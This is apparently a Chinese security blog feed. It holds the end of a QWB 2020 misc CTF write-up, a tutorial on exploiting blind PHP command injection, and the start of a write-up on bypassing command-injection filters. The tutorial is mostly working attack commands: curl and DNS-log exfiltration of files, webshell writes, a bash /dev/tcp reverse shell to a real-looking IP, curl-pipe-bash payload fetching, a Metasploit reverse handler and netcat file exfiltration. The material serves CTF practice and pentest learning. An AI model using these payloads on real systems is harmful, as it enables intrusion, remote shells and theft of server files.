100000110011111111000000011100001111111000001110011100000011000000010011111110000000011100001111111000000110001100000000000100000010000000000000011000001110011001000000100100000000000000000110000000000000000000001110011011100000000000000010001001111110000100000000100000011111111101111100000000000011000000001110000000111111100110000001100000000010000000000011100000001110000000111111100111000000100000000010000000001110000100111111111111000000011100111000011000001100000000001111000110001001100111000000011000011100011000000000000000001111100111001100100101111111111001111100001001110011111100001100000111110000100000000010000000111100011000000011100100001000000111110000100000000010000000111000011000000011100100000011011100000011100000000000000001110000011111000001100100000111111100000011000000000000000011100000001101000000100100001111100000110010000100000000011111000010000000001100010000000111100000000010000110000000000000000110000000001100000000000011100100000010011111000011100000001110000000111000100000001100111000111110011111001111111100001010011111111100011000001000111000111110011111001111111100001110011011111100011000000000000000000010011001001110000001110001111000001100000100000000000000000010011000001100000000110000011000001100000100001111111111110010011000111000110000111100011001001100111100001100000000110000111100000011111111001110001000001100111000001100000000110000111100000011111111001110011000001100111000001100111100110000100001000000100001001110011111111100000000001100111100110000100001000001100001001100001111111000000000001100111100110010011000111111111000111110000111000011011100001100111100110000011000110000000000000110000000000011011100001100111100110000011111110000000100001110011000000000011100001100000000110011100100111000011001111100011111111111100000001100000000110011100100111000011001111100011111111111100000001011111111010010011111110011111001001110011111100000011000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;i=0# print(len(data))for y in range (0,MAX):    for x in range (0,MAX):        if(data[i] == &#39;1&#39;):            pic.putpixel([x,y],(0, 0, 0))        else:            pic.putpixel([x,y],(255,255,255))        i = i+1pic.show()pic.save(&quot;flag.png&quot;)</code></pre><p>运行脚本，得到一个二维码图片，扫描得</p><pre><code class="bash">链接：http://pan.baidu.com/s/1wVJ7d0RLW8Rj-HOTL9Shug提取码：1lms</code></pre><p>下载发现是一个jpg图片，经过<code>stegdetect</code>分析，是jphide隐写</p><pre><code class="bash">stegdetect -tjopi -s 10.0 level4.jpg</code></pre><p><img src="http://img-blog.csdnimg.cn/2020083100483465.png#pic_center" alt="在这里插入图片描述"><br>使用stegbreak爆破密码。(stegbreak是stegdetect工具里的一个程序)</p><pre><code class="bash">stegbreak -r rules.ini -f password.txt -t p [stego_file]# password.txt为字典文件</code></pre><p><img src="http://img-blog.csdnimg.cn/20200831023546657.png" alt="在这里插入图片描述"><br>得到密码为<code>power123</code>。然后使用jphs的seek选项，输入两次密码<code>power123</code>提取隐藏信息</p><pre><code class="bash">http://pan.baidu.com/s/1o43y4UGkm1eP-RViC25aOwmrptlevel4_here_all</code></pre><p><strong>第四关</strong><br>访问第三关的百度网盘链接，下载文件。解压发现level5、level6和level7都在压缩包里，并且还有张1.png图片。但<code>level5.png</code>解压失败，使用foremost工具分离出来了<code>level5.png</code>，打开即是本关的flag：<code>level5_is_aaa</code><br><strong>第五关</strong><br>打开level6.zip，发现有密码并且文件大小都很小，想到crc32碰撞。但通用脚本并没有碰撞出来内容。从wp了解到通用脚本只能碰撞4字节和6字节的。而这个是4字节和5字节的。于是直接拿来师傅的脚本碰撞：</p><pre><code class="py">#coding:utf-8#通用脚本：http://github.com/theonlypwner/crc32 目前适合4、6字节的import binasciiimport string# dic=string.printable   #各种打印字符dic=&#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;crc1 = 0x9aeacc13  # 记得要以0x开头crc2 = 0xeed7e184crc3 = 0x289585afdef CrackCrc5(crc):    for i in dic :        for j in dic:            for p in dic:                for q in dic:                    for h in dic:                        s=i+j+p+q+h                        if crc == (binascii.crc32(s.encode(&quot;ascii&quot;))):                            print (s)                            return 1def CrackCrc4(crc):    for i in dic :        for j in dic:            for p in dic:                for q in dic:                        s=i+j+p+q                        if crc == (binascii.crc32(s.encode(&quot;ascii&quot;))):                            print (s)                            return 1CrackCrc5(crc1)CrackCrc4(crc2)CrackCrc5(crc3)</code></pre><p>运行脚本，得到的内容为<code>level6_isready</code><br><strong>第六关</strong><br>打开level7.zip，发现依旧加密了。但加密的文件有1.png。而之前第四关解压出来的有一张未加密的1.png。于是想到明文攻击：<br>将<code>1.png</code>压缩成<code>1.zip</code><br>使用ARCHPR工具，选择攻击类型为明文。选择加密文件level.zip，明文文件1.zip。开始攻击<br>得到解密后的压缩包<code>level7_decrypted.zip</code>，解压发现两张一样的图<br>一般遇到两张一样的图，可以想到：双图、盲水印。测试后发现要使用python3版本的</p><pre><code class="py">python3 bwmforpy3.py decode 4.png 5.png result.png</code></pre><p><img src="http://img-blog.csdnimg.cn/20200831033342332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code class="bash">level7ishere39.99.247.28/final_level</code></pre><p><strong>第七关</strong><br>访问第六关得到的地址<code>39.99.247.28/final_level</code>，额，没找到关键信息。瞟一眼wp，发现snow，第一印象想成了whitespace隐写，然而并不是。看一下大师傅这部分的完整wp：</p><blockquote><p>这里是静态页面且目录下无法扫到其它的东西。那么应该是一种隐写。最后发现存在 snow 在html嵌入隐写信息，我们可以直接去解密网站在线解密 <a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html" target="_blank" rel="noopener">http://fog.misty.com/perry/ccs/snow/snow/snow.html</a>   但是这里我们还需要知道其密码。经过反复尝试和查找，发现其密码居然是   no one can find me</p></blockquote><p>额，这就很明确了。考察的是在html嵌入隐写信息，直接使用解密网站解密，密码是在源代码处发现的<code>no one can find me</code>，解密得到<code>the_misc_examaaaaaaa_!!!}</code></p><p>七关拼在一起就是最终flag!</p><h3 id="0x08-后记"><a href="#0x08-后记" class="headerlink" title="0x08 后记"></a>0x08 后记</h3><p>总的来说，这次强网杯比赛收获很大。学到的新知识有：<code>md4</code>、<code>反序列化逃逸</code>、<code>steghide隐写爆破密码</code>、<code>hash碰撞</code>、<code>TLS解密</code>、<code>二进制作像素点画图</code>、<code>jphide隐写</code>、<code>4字节和5字节的crc32碰撞</code>、<code>snow在html嵌入隐写信息</code><br>参考：<a href="https://www.gem-love.com/ctf/2576.html#halfinfiltration" target="_blank" rel="noopener">2020第四届“强网杯”全国网络安全挑战赛初赛Writeup</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> 强网杯 </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈PHP无回显命令执行的利用</title>
      <link href="/2020/08/18/%E6%B5%85%E8%B0%88PHP%E6%97%A0%E5%9B%9E%E6%98%BE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%88%A9%E7%94%A8/"/>
      <url>/2020/08/18/%E6%B5%85%E8%B0%88PHP%E6%97%A0%E5%9B%9E%E6%98%BE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p><strong>本文首发于先知社区</strong></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在CTF题或在一些渗透测试中往往会遇到没有回显的命令执行漏洞，为了能更好的实现对无回显命令执行漏洞的利用，我对此进行了简单总结。</p><h3 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h3><p>命令执行可能会存在命令执行但没有回显，所以首先要判断命令是否有执行。确定命令可以执行，然后就可以进行无回显命令执行的利用了。</p><h4 id="1、审计代码"><a href="#1、审计代码" class="headerlink" title="1、审计代码"></a>1、审计代码</h4><p>审计代码，根据代码逻辑判断(这个就需要扎实的审计代码能力的功底了)</p><h4 id="2、利用延时"><a href="#2、利用延时" class="headerlink" title="2、利用延时"></a>2、利用延时</h4><pre><code class="shell">ip=|sleep 5</code></pre><p>如果执行后延时5秒，就证明测试点存在命令执行漏洞</p><h4 id="3、HTTP请求"><a href="#3、HTTP请求" class="headerlink" title="3、HTTP请求"></a>3、HTTP请求</h4><blockquote><p>注意：ping命令不会产生http请求</p></blockquote><p><strong>1.在公网服务器监听监听端口</strong></p><pre><code class="shell">nc -lp 4444</code></pre><p><strong>2.向目标服务器发起http请求，执行curl命令</strong></p><pre><code class="shell">ip=|curl ip:4444</code></pre><p>如果向目标服务器发起http请求后，公网服务器监听端口得到一些信息，就证明测试点存在命令执行漏洞。</p><h4 id="4、DNS请求"><a href="#4、DNS请求" class="headerlink" title="4、DNS请求"></a>4、DNS请求</h4><blockquote><p>如果请求的目标不是ip地址而是域名，那么域名最终还要转化成ip地址，就肯定要做一次域名解析请求。那么假设我有个可控的二级域名，那么它发出三级域名解析的时候，我这边是能够拿到它的域名解析请求的，这就相当于可以配合DNS请求进行命令执行的判断，这一般就被称为dnslog。（要通过dns请求即可通过ping命令，也能通过curl命令，只要对域名进行访问，让域名服务器进行域名解析就可实现）  来源：安全脉搏</p></blockquote><p>（1）首先去<code>ceye.io</code>注册个账号，注册完后会给一个域名<br><img src="http://img-blog.csdnimg.cn/20200807002925899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我注册后给的域名是<code>v4utm7.ceye.io</code><br>（2）如果有域名解析请求就会被记录。访问<code>qwzf.v4utm7.ceye.io</code>，那么就会记录下来这个域名解析请求。<br><img src="http://img-blog.csdnimg.cn/20200807003433591.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200807003600192.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>简单测试一下向目标服务器发起http请求，执行下面的命令</p><pre><code class="shell">ip=|curl `whoami`.v4utm7.ceye.io</code></pre><p><img src="http://img-blog.csdnimg.cn/20200808025907696.png" alt="在这里插入图片描述"><br>查看dnslog<br><img src="http://img-blog.csdnimg.cn/20200808030031819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>若果得到执行结果(如上面执行<code>whoami</code>命令，得到<code>www-data</code>)，就说明测试点存在命令执行。</p><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>了解了无回显命令执行的判断方法后，当然是还需要了解学习一下无回显命令执行的利用方法。<br>但测试利用方法之前，首先要准备一下环境。于是我写出下面的测试代码进行利用测试：<br><code>index.php</code></p><pre><code class="php">&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);include(&quot;flag.php&quot;);$ip=$_REQUEST[&#39;ip&#39;];if($ip){    shell_exec(&quot;ping -c 4 &quot;.$ip);}?&gt;</code></pre><h4 id="1、执行命令"><a href="#1、执行命令" class="headerlink" title="1、执行命令"></a>1、执行命令</h4><blockquote><p>利用条件：需要站点目录具有写权限</p></blockquote><p>通过执行命令，直接将php文件写入到在浏览器可直接读取的文件类型中(如txt文件)，然后访问txt文件即可得到php文件内容<br><strong>1.使用<code>&gt;</code>或<code>&gt;&gt;</code></strong></p><pre><code class="shell">cat flag.php &gt; flag.txtcat flag.php &gt;&gt; flag.txt</code></pre><p><img src="http://img-blog.csdnimg.cn/20200807021916734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200807022040888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>2.使用<code>cp</code>命令</strong></p><pre><code class="shell">cp flag.php flag.txt</code></pre><p><strong>3.使用<code>mv</code>命令</strong></p><pre><code class="shell">mv flag.php flag.txt</code></pre><p>通过执行tar命令和zip命令打包或压缩php文件，在浏览器上下载打包或压缩文件解压得到php文件内容<br>（1）tar打包或tar打包并压缩</p><pre><code class="shell">tar cvf flag.tar flag.phptar zcvf flag.tar.gz flag.php#解打包并解压缩：tar zxvf flag.tar.gz</code></pre><p><img src="http://img-blog.csdnimg.cn/20200807022625521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解打包得到flag：<br><img src="http://img-blog.csdnimg.cn/20200807022827507.png" alt="在这里插入图片描述"><br>（2）zip压缩</p><pre><code class="shell">zip flag.zip flag.php#解压缩：unzip flag.zip</code></pre><p>等等。</p><h4 id="2、写webshell-直接写入或外部下载webshell"><a href="#2、写webshell-直接写入或外部下载webshell" class="headerlink" title="2、写webshell(直接写入或外部下载webshell)"></a>2、写webshell(直接写入或外部下载webshell)</h4><blockquote><p>利用条件：需要站点目录具有写权限</p></blockquote><p><strong>1.写webshell</strong></p><pre><code class="shell">echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.phpecho &quot;&lt;?php @eval(\$_POST[123]); ?&gt;&quot; &gt; webshell.php</code></pre><p><strong>2.外部下载shell</strong></p><blockquote><p>利用条件：目标服务器可以连接外网或可以与攻击机互通，且能执行wget命令</p></blockquote><pre><code class="shell">wget 网址 -O webshell.php #使用wget下载shell，使用参数-O来指定一个文件名</code></pre><p>利用命令执行写webshell或外部下载webshell后，用蚁剑连接测试，发现成功<br><img src="http://img-blog.csdnimg.cn/20200807033059749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后在蚁剑里直接查看flag.php文件，即可得到flag。</p><h4 id="3、在vps上建立记录脚本"><a href="#3、在vps上建立记录脚本" class="headerlink" title="3、在vps上建立记录脚本"></a>3、在vps上建立记录脚本</h4><blockquote><p>利用条件：需要目标服务器可以向公网服务器发起http请求，并且能执行curl命令或wget命令</p></blockquote><p><strong>1.构造记录脚本</strong><br>在自己的公网服务器站点根目录写入php文件，内容如下：<br><code>record.php</code></p><pre><code class="shell">&lt;?php$data =$_GET[&#39;data&#39;];$f = fopen(&quot;flag.txt&quot;, &quot;w&quot;);fwrite($f,$data);fclose($f);?&gt;</code></pre><p><strong>2.构造请求</strong><br>在目标服务器的测试点可以发送下面其中任意一条请求进行测试</p><pre><code class="php">curl http://*.*.*.**/record.php?data=`cat flag.php`wget http://*.*.*.*/record.php?data=`cat flag.php`</code></pre><p><strong>3.测试</strong><br><img src="http://img-blog.csdnimg.cn/20200809005535400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>执行命令后发现在公网服务器得到的<code>flag.txt</code>文件中，只得到下面内容，并未得到flag<br><img src="http://img-blog.csdnimg.cn/20200809004839426.png" alt="在这里插入图片描述"><br>于是考虑对命令执行的结果进行编码后写入<code>flag.txt</code>文件</p><pre><code class="shell">curl http://*.*.*.**/record.php?data=`cat flag.php|base64`wget http://*.*.*.*/record.php?data=`cat flag.php|base64`</code></pre><p>最终得到<br><img src="http://img-blog.csdnimg.cn/20200809005329589.png" alt="在这里插入图片描述"><br>Base64解码即可得到flag。</p><h4 id="4、通过dnslog带出数据"><a href="#4、通过dnslog带出数据" class="headerlink" title="4、通过dnslog带出数据"></a>4、通过dnslog带出数据</h4><blockquote><p>（1）命令执行时要避免空格，空格会导致空格后面的命令执行不到；<br>（2）将读取的文件命令用反引号``包含起来；<br>（3）拼接的域名有长度限制。</p></blockquote><p>利用命令：</p><pre><code class="shell">curl `命令`.域名</code></pre><p>测试一下命令</p><pre><code class="shell">#用&lt;替换读取文件中的空格，且对输出结果base64编码curl `cat&lt;flag.php|base64`#拼接域名(最终构造结果)curl `cat&lt;flag.php|base64`.v4utm7.ceye.io#另一种方法(不过有的环境下不可以)`cat flag.php|sed s/[[:space:]]//g`.v4utm7.ceye.io</code></pre><p><img src="http://img-blog.csdnimg.cn/20200807233034693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>利用dnslog，查看文件内容(flag.php文件内容)<br><img src="http://img-blog.csdnimg.cn/20200807233142132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>base64解码得到flag<br><img src="http://img-blog.csdnimg.cn/20200807233459278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="5、反弹shell"><a href="#5、反弹shell" class="headerlink" title="5、反弹shell"></a>5、反弹shell</h4><blockquote><p>利用条件：目标服务器可以向可通信的公网服务器发起http请求</p></blockquote><blockquote><p>1.服务器端执行<br>nc -vv -lp 8888<br>2.命令执行处执行<br>bash -i &gt;&amp; /dev/tcp/47.95.206.199/8888 0&gt;&amp;1<br>3.payload<br>ip=127.0.0.1%0d%0abash+-i+&gt;%26+/dev/tcp/47.95.206.199/8888+0&gt;%261<br>注意：百度搜索到的基本上都是上边这个方法，但经过测试并未成功。于是想到以前见过的一种方法</p></blockquote><pre><code class="shell">#1.首先在公网服务器使用nc命令监听端口nc -lvp 4444 #或nc -vv -lp 4444#2.然后在公网服务器上写一个文件(我写入到qwzf文件)，内容是下面命令bash -i &gt;&amp; /dev/tcp/x.x.x.165/4444 0&gt;&amp;1#3.最终浏览器上执行的payload(实际上就是在目标机执行curl x.x.x.165:8002/qwzf|bash)ip=|curl x.x.x.165:8002/qwzf|bash</code></pre><p><img src="http://img-blog.csdnimg.cn/20200808010020913.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200808001336169.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200808010806598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="6、msf反向回连"><a href="#6、msf反向回连" class="headerlink" title="6、msf反向回连"></a>6、msf反向回连</h4><blockquote><p>利用条件：目标服务器可以向可通信的公网服务器发起http请求</p></blockquote><p><strong>1.远程服务器用msf监听：</strong></p><pre><code class="shell">use exploit/multi/handlerset payload linux/armle/shell/reverse_tcpset lport 4444set lhost xxx.xxx.xxx.xxxset exitonsession falseexploit -j</code></pre><p><img src="http://img-blog.csdnimg.cn/20200808014306136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>2.目标服务器执行下面命令</strong></p><pre><code class="shell">ip=|bash -i &gt;&amp; /dev/tcp/xxxxx(vps公网ip)/4444 0&gt;&amp;1#如果上面这条命令在浏览器上执行失败。那么要将上面这条命令写入公网服务器上的一个文件中，在msf开始监听后，在测试点执行下面命令ip=|curl x.x.x.165:8002/qwzf|bash</code></pre><p><strong>3.公网服务器接收shell</strong><br>目标服务器上执行命令后，会在公网服务器上接收到，然后在公网服务器上执行以下命令getshell</p><pre><code class="shell">sessions -i 1shell</code></pre><p><img src="http://img-blog.csdnimg.cn/20200808014758936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后<code>cat flag.php</code>得到flag。</p><h4 id="7、使用nc"><a href="#7、使用nc" class="headerlink" title="7、使用nc"></a>7、使用nc</h4><blockquote><p>利用条件：要求目标服务器也有nc工具</p></blockquote><pre><code class="shell">#1.公网服务器监听4444端口nc -tlp 4444#2.目标服务器执行如下命令ip=|nc -t x.x.x.165 4444 &lt; flag.php-u参数调整为udp,当tcp不能使用的时候使用#1.公网服务器监听4444端口nc -ulp 4444#2.目标服务器执行如下命令ip=|nc -u x.x.x.165 4444 &lt; flag.php</code></pre><p><img src="http://img-blog.csdnimg.cn/20200808005738442.png" alt="在这里插入图片描述"></p><h4 id="8、curl上传文件读取源码"><a href="#8、curl上传文件读取源码" class="headerlink" title="8、curl上传文件读取源码"></a>8、curl上传文件读取源码</h4><blockquote><p>利用条件：目标服务器curl命令可以正常执行</p></blockquote><blockquote><p>使用<code>curl -F</code>将flag文件上传到Burp的Collaborator Client(Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看POST请求包以及打Cookies)</p></blockquote><p><strong>1.获取<code>Collaborator Client</code>分配给Burp的链接</strong></p><pre><code class="shell">打开Burp主界面 -&gt; 菜单（Burp）-&gt; Collaboraor Client -&gt; 点击Copy to Clipboard</code></pre><p><img src="http://img-blog.csdnimg.cn/20200808020335220.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200808020402436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Copy得到</p><pre><code class="shell">jyla6p5cfepdojez34stnodch3ntbi.burpcollaborator.net</code></pre><p><strong>2.拼接payload并在命令执行处提交</strong></p><pre><code class="shell">ip=|curl -X POST -F xx=@flag.php http://jyla6p5cfepdojez34stnodch3ntbi.burpcollaborator.net</code></pre><p><strong>3.查看Collaborator Client收到的数据</strong><br><img src="http://img-blog.csdnimg.cn/20200808020956879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功得到flag。</p><h3 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h3><p>学习过程中，发现参考资料个别地方存在一些小错误(估计是测试环境不同导致的)，并且有些地方不太完善。于是，自己通过测试和分析后，总结了这篇文章，希望能更好的学习无回显命令执行的利用。</p><p>参考博客：<br><a href="https://www.cnblogs.com/hello-py/articles/13385679.html" target="_blank" rel="noopener">命令执行没有回显利用</a><br><a href="http://www.admintony.com/%E6%97%A0%E5%9B%9E%E6%98%BE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95.html" target="_blank" rel="noopener">无回显代码执行利用方法</a><br><a href="https://www.secpulse.com/archives/115970.html" target="_blank" rel="noopener">命令执行无回显的判断方法及dnslog相关例题</a><br><a href="http://blog.merl1ng.cc/2018/03/02/dnslog%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">dnslog利用</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> 命令注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 无回显命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行绕过的练习(一)</title>
      <link href="/2020/08/12/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E7%9A%84%E7%BB%83%E4%B9%A0(%E4%B8%80)/"/>
      <url>/2020/08/12/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E7%9A%84%E7%BB%83%E4%B9%A0(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>总结完命令执行漏洞的相关绕过知识，做一下CTF题巩固一下，并总结一下做题过程。</p><h2 id="0x01-GKCTF-Check-In"><a href="#0x01-GKCTF-Check-In" class="headerlink" title="0x01 GKCTF-Check_In"></a>0x01 GKCTF-Check_In</h2><p><strong>考点：绕过disable_function</strong><br>题目源码：</p><pre><code class="php">&lt;title&gt;Check_In&lt;/title&gt;&lt;?php highlight_file(__FILE__);class ClassName{        public $code = null;        public $decode = null;        function __construct()        {                $this-&gt;code = @$this-&gt;x()[&#39;Ginkgo&#39;];                $this-&gt;decode = @base64_decode( $this-&gt;code );                @Eval($this-&gt;decode);        }        public function x()        {                return $_REQUEST;        }}new ClassName();</code></pre><p>经测试发现可以连接上木马，但不能执行系统命令，从而无法执行根目录下的<code>/readflag</code>命令。</p><pre><code class="shell">//eval($_POST[&#39;qwzf&#39;]); -&gt; ZXZhbCgkX1BPU1RbJ3F3emYnXSk7蚁剑连接：?Ginkgo=ZXZhbCgkX1BPU1RbJ3F3emYnXSk7</code></pre><p>然后查看phpinfo信息，发现disable_function禁用了命令执行函数。于是可以想到下面几种方式绕过disable_function<br><strong>1.利用ld_preload</strong><br>在phpinfo信息发现没有禁用mail函数，所以可以利用ld_preload绕过disable_function</p><pre><code class="php">在蚁剑里的/tmp目录下，传入之前文章提到的qwzf2.php和hack2.so//include(&#39;/tmp/qwzf2.php&#39;); -&gt; aW5jbHVkZSgnL3RtcC9xd3pmMi5waHAnKTs=?Ginkgo=aW5jbHVkZSgnL3RtcC9xd3pmMi5waHAnKTs=POST：cmd=/readflag&amp;outpath=/tmp/test&amp;sopath=/tmp/hack2.so</code></pre><p><img src="http://img-blog.csdnimg.cn/2020080522503742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>2.利用php_gc</strong><br>因为php环境是php7.3，在PHP7.0~PHP7.3之间，所以也可以用php7-gc-bypass的POC打一下即可得到flag：</p><pre><code class="php">//include(&#39;/tmp/exploit.php&#39;); -&gt; aW5jbHVkZSgnL3RtcC9leHBsb2l0LnBocCcpOw==?Ginkgo=aW5jbHVkZSgnL3RtcC9leHBsb2l0LnBocCcpOw==//访问一下，即可得到flag</code></pre><p><img src="http://img-blog.csdnimg.cn/202008060238175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>更多方法参考：<a href="https://www.anquanke.com/post/id/208451" target="_blank" rel="noopener">bypass disable_function多种方法+实例</a></p><h2 id="0x02-CTFhub技能树RCE-过滤cat"><a href="#0x02-CTFhub技能树RCE-过滤cat" class="headerlink" title="0x02 CTFhub技能树RCE-过滤cat"></a>0x02 CTFhub技能树RCE-过滤cat</h2><p><strong>考点：绕过文件内容读取(绕过cat)</strong><br>首先</p><pre><code class="bash">?ip=|ls</code></pre><p>发现flag文件<code>flag_4052237514444.php</code><br>题目给出源码，发现过滤了cat。于是绕过cat</p><pre><code class="bash">?ip=|more flag_4052237514444.php#more/less/head/tac/tail/nl/vi/vim/uniq/file -f/sort，以及od -c命令均可</code></pre><p>然后查看源代码，得到flag</p><h2 id="0x03-CTFhub技能树RCE-过滤空格"><a href="#0x03-CTFhub技能树RCE-过滤空格" class="headerlink" title="0x03 CTFhub技能树RCE-过滤空格"></a>0x03 CTFhub技能树RCE-过滤空格</h2><p><strong>考点：绕过空格</strong><br>首先</p><pre><code class="bash">?ip=|ls</code></pre><p>发现flag文件<code>flag_1304577872279.php</code><br>题目给出源码，发现过滤了空格。于是绕过空格</p><pre><code class="bash">?ip=|cat${IFS}flag_1304577872279.php#$IFS$9/%09/&lt;/均可</code></pre><p>然后查看源代码，得到flag</p><h2 id="0x04-CTFhub技能树RCE-过滤目录分隔符"><a href="#0x04-CTFhub技能树RCE-过滤目录分隔符" class="headerlink" title="0x04 CTFhub技能树RCE-过滤目录分隔符"></a>0x04 CTFhub技能树RCE-过滤目录分隔符</h2><p><strong>考点：绕过目录分隔符<code>/</code></strong><br>首先</p><pre><code class="bash">?ip=|ls</code></pre><p>发现flag文件所在目录<code>flag_is_here</code><br>题目给出源码，发现过滤了目录分隔符<code>/</code>。于是绕过<code>/</code><br>有两种方法：<br>方法一：使用linux的系统环境变量<code>${PATH:0:1}</code>代替<code>/</code></p><pre><code class="bash">?ip=|ls flag_is_here${PATH:0:1}得到flag文件flag_19492409018809.php?ip=|cat flag_is_here${PATH:0:1}flag_19492409018809.php查看源代码得到flag</code></pre><p>方法二：利用<code>;</code>分隔符连续执行指令</p><pre><code class="bash">?ip=;cd flag_is_here;ls得到flag文件flag_19492409018809.php?ip=;cd flag_is_here;cat flag_19492409018809.php查看源代码得到flag</code></pre><h2 id="0x05-CTFhub技能树RCE-过滤运算符"><a href="#0x05-CTFhub技能树RCE-过滤运算符" class="headerlink" title="0x05 CTFhub技能树RCE-过滤运算符"></a>0x05 CTFhub技能树RCE-过滤运算符</h2><p><strong>考点：绕过运算符<code>|</code>和<code>&amp;</code></strong><br>题目给出源码，发现过滤了运算符<code>|</code>和<code>&amp;</code>。于是直接利用<code>;</code>分隔符绕过</p><pre><code class="bash">?ip=;ls得到flag文件flag_16845171801250.php?ip=;cat flag_16845171801250.php查看源代码得到flag</code></pre><h2 id="0x06-CTFhub技能树RCE-综合过滤练习"><a href="#0x06-CTFhub技能树RCE-综合过滤练习" class="headerlink" title="0x06 CTFhub技能树RCE-综合过滤练习"></a>0x06 CTFhub技能树RCE-综合过滤练习</h2><p><strong>考点：绕过运算符、<code>;</code>、空格、目录分隔符<code>/</code>、<code>cat</code>、<code>flag和ctfhub关键字</code></strong></p><pre><code class="php">&lt;?php$res = FALSE;if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) {    $ip = $_GET[&#39;ip&#39;];    $m = [];    if (!preg_match_all(&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;, $ip, $m)) {        $cmd = &quot;ping -c 4 {$ip}&quot;;        exec($cmd, $res);    } else {        $res = 